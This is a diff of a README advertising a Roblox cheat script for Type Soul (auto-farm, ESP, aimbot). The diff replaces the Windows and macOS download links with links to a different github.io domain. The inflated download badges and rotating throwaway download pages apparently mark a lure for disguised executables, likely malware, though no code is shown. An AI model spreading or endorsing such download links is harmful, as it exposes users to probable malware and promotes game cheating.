@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Type Soul Script](https://img.shields.io/badge/Download%20Type%20Soul%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://hornbladesmanhonor.github.io/download-win/)
+[![Download Type Soul Script](https://img.shields.io/badge/Download%20Type%20Soul%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://phantommofence.github.io/download-win/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Type Soul Script** for Type Soul — auto-farm, ESP, aimbot,
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://hornbladesmanhonor.github.io/download-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
 
 </div>
 
